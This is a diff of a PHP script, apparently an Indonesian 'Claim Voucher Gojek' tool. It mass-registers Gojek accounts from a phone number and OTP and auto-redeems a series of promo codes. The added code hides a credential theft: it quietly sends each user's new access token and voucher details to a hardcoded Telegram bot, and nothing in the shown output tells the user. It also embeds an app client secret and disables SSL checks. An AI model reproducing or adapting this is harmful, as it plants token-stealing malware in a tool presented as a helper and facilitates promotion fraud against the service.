@@ -1,157 +1,190 @@
 <?php
-echo "====== ( GOJEK AUTO REGIST AND REDEEM ) ======";
-include 'curl.php';
-define('Uniqueid', string(16));
-function regis() {
-        $nam = nama();
-        $nama = explode(" ", $nam);
-        $namadepan = $nama[0];
-        $namabelakang = $nama[1];
-        $rand = rand(0000,9999);
-        $user = $namadepan.$rand;
-        $email = $user."@gmail.com";
-        awal:
-        echo "\n(?) Nomor HP: ";
-        $number1 = trim(fgets(STDIN));
-        $number = "+".$number1;
-	$headers1 = array(
-        'X-Session-ID: 346527b1-73ee-4e8a-bf2b-97b6f18ab9e4',
-	'X-Platform: Android',
-	'X-UniqueId: '.Uniqueid,
-	'X-AppVersion: 3.34.1',
-	'X-AppId: com.gojek.app',
-	'Accept: application/json',
-	'X-PhoneModel: Android,Custom',
-	'X-PushTokenType: FCM',
-	'X-DeviceOS: Android,6.0', 
-	'Authorization: Bearer',
-	'Accept-Language: id-ID',
-	'X-User-Locale: id_ID',
-	'Content-Type: application/json; charset=UTF-8',
-	'User-Agent: okhttp/3.12.1'
-	);
+date_default_timezone_set('Asia/Jakarta');
+include "function.php";
+echo color("red"," ===========================\n");
+echo color("red","| Claim Voucher Gojek|\n");
+echo color("red","| Auto create Gojek X Redeem voucher |\n");
+echo color("red","| github: kg69 |\n");
+echo color("red","| fanspage :kg69|\n");
+echo color("red","| Creator : kg69          |\n");
+echo "| Version : Premium X pertalite      |\n";
+echo "| Time    :".date('[d-m-Y] [H:i:s]')."   |\n";
+echo " ===========================\n";
 
-	$sendotp = curl('https://api.gojekapi.com/v5/customers', '{"email":"'.$email.'","name":"'.$namadepan.' '.$namabelakang.'","phone":"'.$number.'","signed_up_country":"ID"}', $headers1);
-        if(strpos($sendotp, '"success":true')){
-        echo "(+) Kode verifikasi sudah dikirim";
-        $otptoken = fetch_value($sendotp,'"otp_token":"','"');
-        echo "\n(?) Kode Verifikasi : ";
-        $otp = trim(fgets(STDIN));
-        $verifotp = curl('https://api.gojekapi.com/v5/customers/phone/verify', '{"client_name":"gojek:cons:android","client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e","data":{"otp":"'.$otp.'","otp_token":"'.$otptoken.'"}}', $headers1);
-        if(strpos($verifotp, '"access_token"')){
-                echo "(+) Kode verifikasi benar";
-                sleep(5);
-        $result1 = fetch_value($verifotp, '"access_token":"','"');
-        $headers2 = array(
-        'X-Session-ID: 346527b1-73ee-4e8a-bf2b-97b6f18ab9e4',
-	'X-Platform: Android',
-	'X-UniqueId: '.Uniqueid,
-	'X-AppVersion: 3.34.1',
-	'X-AppId: com.gojek.app',
-	'Accept: application/json',
-	'X-PhoneModel: Android,Custom',
-	'X-PushTokenType: FCM',
-	'X-DeviceOS: Android,6.0',
-	'Authorization: Bearer '.$result1,
-	'Accept-Language: id-ID',
-	'X-User-Locale: id_ID',
-	'Content-Type: application/json; charset=UTF-8',
-	'User-Agent: okhttp/3.12.1',
-	);
-        $cek = curl('https://api.gojekapi.com/v2/customer/cards/home?filters=', null, $headers2);
-        $code = fetch_value($cek,'code=GOJEKINAJA','"');
-        $code2 = fetch_value($cek,'code=COBAINGOJEK','"');
-        $code1 = "GOFOOD".$code;
-        $code3 = "COBAINGOJEK".$code2;
-        echo "\n======# DAFTAR KODE VOUCHER GOJEK #======";
-        echo "\n[1] GOBIZ";
-        echo "\n[2] GORIDE";
-        echo "\n[3] GOFOOD FIXED";
-        echo "\n[4] INFO VOUCHER GOFOOD\n";
-        pilih:
-        echo "\n(?) Pilih Kode Voucher : ";
-        $pilihan = trim(fgets(STDIN));
-        sleep(1);
-        if($pilihan == "1"){
-        $promo = curl('https://api.gojekapi.com/go-promotions/v1/promotions/enrollments', '{"promo_code":"'.$code1.'"}', $headers2);
-        $meassage = fetch_value($promo,'{"message":"','"');
-        echo "(+) ".$meassage;
-        sleep(1);
-        echo "\n(?) Apakah Anda Ingin Me-Redeem Voucher Lagi?? (y/n): ";
-        $pilih = trim(fgets(STDIN));
-        if($pilih == "y"){
-        goto pilih;
-        }else{                
-        die();
+// function change(){
+        $nama = nama();
+        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
+        ulang:
+        echo color("nevy","?] Nomor : ");
+        // $no = trim(fgets(STDIN));
+        $nohp = trim(fgets(STDIN));
+        $nohp = str_replace("62","62",$nohp);
+        $nohp = str_replace("(","",$nohp);
+        $nohp = str_replace(")","",$nohp);
+        $nohp = str_replace("-","",$nohp);
+        $nohp = str_replace(" ","",$nohp);
+
+        if (!preg_match('/[^+0-9]/', trim($nohp))) {
+            if (substr(trim($nohp),0,3)=='62') {
+                $hp = trim($nohp);
+            }
+            else if (substr(trim($nohp),0,1)=='0') {
+                $hp = '62'.substr(trim($nohp),1);
         }
-        }else if($pilihan == "2"){
-        $promo1 = curl('https://api.gojekapi.com/go-promotions/v1/promotions/enrollments', '{"promo_code":"'.$code3.'"}', $headers2);
-        $message1 = fetch_value($promo1,'{"message":"','"');
-        echo "(+) ".$message1;
-        echo "\n(?) Apakah Anda Ingin Me-Redeem Voucher Lagi?? (y/n): ";
-        $pilih = trim(fgets(STDIN));
-        if($pilih == "y"){
-        goto pilih;
-        }else{                
-        die();
+         elseif(substr(trim($nohp), 0, 2)=='62'){
+            $hp = '6'.substr(trim($nohp), 1);
         }
-        }else if($pilihan == "3"){
-        $promo2 = curl('https://api.gojekapi.com/go-promotions/v1/promotions/enrollments', '{"promo_code":"GOJEKINAJA"}', $headers2);
-        $message2 = fetch_value($promo2,'{"message":"','"');
-        if(strpos($message2, 'cobain!')){
-        echo "(+) ".$message2;
-        echo "\n(?) Apakah Anda Ingin Me-Redeem Voucher Lagi?? (y/n): ";
-        $pilih = trim(fgets(STDIN));
-        if($pilih == "y"){
-        goto pilih;
-        }else{               
-        die();
-        }
-        }else{
-        echo "[-] Kode promo sudah tidak aktif";
-        echo "\n(?) Apakah Anda Ingin Me-Redeem Voucher Lagi?? (y/n): ";
-        $pilih = trim(fgets(STDIN));
-        if($pilih == "y"){
-        goto pilih;
-        }else{
-        die();
-        }
-        }
-        }else if($pilihan == "4"){
-                echo "JIKA VOUCHER GOFOOD 1 GABISA DIPAKAI, SILAHKAN REDEEM ULANG, KEMUDIAN PILIH KODE VOUCHER 3\n";
-                echo "\n(?) Apakah Anda Ingin Me-Redeem Voucher Lagi?? (y/n): ";
-                $pilih = trim(fgets(STDIN));
-                if($pilih == "y"){
-                goto pilih;
-                }else{                
-                die();
-                }
-                }else{
-        echo "[-] Pilihan tidak ada,silahkan pilih lgi\n";
-        sleep(4);
-        goto pilih;
+        else{
+            $hp = '1'.substr(trim($nohp),0,13);
         }
     }
-  }else if(strpos($sendotp, '"message":"Nomor HP-mu sudah terdaftar')){
-  echo "[-] Nomor Hp mu sudah terdaftar";
-  echo "\n======-# Silahkan coba ulang #======-\n";
-  goto awal;
-  }else if(strpos($sendotp, 'Email-mu sudah terdaftar')){
-  echo "[-] Email sudah terdaftar";
-  echo "\n======-# Silahkan coba ulang #======-\n";
-  goto awal;
-  }
- }
-function start(){
-echo regis();
-echo "\n";
-}
-start();
-echo "(?) Ingin Mendaftar Lagi ?(y/n):";
-$WTF = trim(fgets(STDIN));
-if($WTF == "y"){
-start();
-}else{
-die();
-}
+        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
+        $register = request("/v5/customers", null, $data);
+        if(strpos($register, '"otp_token"')){
+        $otptoken = getStr('"otp_token":"','"',$register);
+        echo color("green","+] Kode verifikasi sudah di kirim")."\n";
+        otp:
+        echo color("nevy","?] Otp: ");
+        $otp = trim(fgets(STDIN));
+        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
+        $verif = request("/v5/customers/phone/verify", null, $data1);
+        if(strpos($verif, '"access_token"')){
+        echo color("green","+] Berhasil mendaftar\n");
+        $token = getStr('"access_token":"','"',$verif);
+        $uuid = getStr('"resource_owner_id":',',',$verif);
+        echo color("green","+] Your access token : ".$token."\n\n");
+        save("token.txt",$token);
+        echo color("red","\n===========(REDEEM VOUCHER)===========");
+        echo "\n".color("yellow","!] Claim voc GOJEKPWON");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(1);
+        }
+        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOJEKPWON"}');
+        $message = fetch_value($code1,'"message":"','"');
+        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
+        echo "\n".color("green","+] Message: ".$message);
+        goto goride;
+        }else{
+        echo "\n".color("red","-] Message: ".$message);
+        echo "\n".color("yellow","!] Claim voc GOJEKBANGKIT");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(1);
+        }
+        sleep(3);
+        $boba10 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOJEKBANGKIT"}');
+        $messageboba10 = fetch_value($boba10,'"message":"','"');
+        if(strpos($boba10, 'Promo kamu sudah bisa dipakai.')){
+        echo "\n".color("green","+] Message: ".$messageboba10);
+        goto goride;
+        }else{
+        echo "\n".color("red","-] Message: ".$messageboba10);
+        echo "\n".color("yellow","!] Claim voc GOFOODSANTUY08");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(1);
+        }
+        sleep(3);
+        $boba19 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODSANTAI08"}');
+        $messageboba19 = fetch_value($boba19,'"message":"','"');
+        if(strpos($boba19, 'Promo kamu sudah bisa dipakai.')){
+        echo "\n".color("green","+] Message: ".$messageboba19);
+        goto goride;
+        }else{
+        echo "\n".color("green","+] Message: ".$messageboba19);
+        goride:
+        echo "\n".color("yellow","!] Claim voc AYOCOBAGOJEK");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(1);
+        }
+        sleep(3);
+        $goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"AYOCOBAGOJEK"}');
+        $message1 = fetch_value($goride,'"message":"','"');
+        echo "\n".color("green","+] Message: ".$message1);
+        echo "\n".color("yellow","!] Claim voc COBAINGOJEK");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(1);
+        }
+        sleep(3);
+        $goride1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAINGOJEK"}');
+        $message2 = fetch_value($goride1,'"message":"','"');
+        echo "\n".color("green","+] Message: ".$message2);
+        sleep(3);
+        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
+        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
+        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
+        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
+        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
+        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
+        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
+        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
+        $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
+        echo "\n".color("yellow","!] Total voucher ".$total." : ");
+        echo color("green","1. ".$voucher1);
+        echo "\n".color("green","                     2. ".$voucher2);
+        echo "\n".color("green","                     3. ".$voucher3);
+        echo "\n".color("green","                     4. ".$voucher4);
+        echo "\n".color("green","                     5. ".$voucher5);
+        echo "\n".color("green","                     6. ".$voucher6);
+        echo "\n".color("green","                     7. ".$voucher7);
+        echo"\n";
+        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
+        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
+        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
+        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
+        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
+        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
+        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
+        $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
+    $chatid = "785784404";
+    $pesan  = "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
+    $method = "sendMessage";
+    $url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
+    $post = [
+        'chat_id' => $chatid,
+                'text' => $pesan
+            ];
+                $header = [
+                "X-Requested-With: XMLHttpRequest",
+                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
+                        ];
+                                        $ch = curl_init();
+                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                                        curl_setopt($ch, CURLOPT_URL, $url);
+                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
+                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                                        $datas = curl_exec($ch);
+                                        $error = curl_error($ch);
+                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                                        curl_close($ch);
+                                        $debug['text'] = $pesan;
+                                        $debug['respon'] = json_decode($datas, true);
+        
+         
+         }
+         }
+        }
+         }else{
+            echo color("red","-] Otp yang anda input salah");
+            echo"\n==================================\n\n";
+            echo color("yellow","!] Silahkan input kembali\n");
+            goto otp;
+            }
+         }else{
+         echo color("red","-] Nomor sudah teregistrasi");
+         echo"\n==================================\n\n";
+         echo color("yellow","!] Silahkan registrasi kembali\n");
+         goto ulang;
+         }
+//  }
 
+// echo change()."\n";
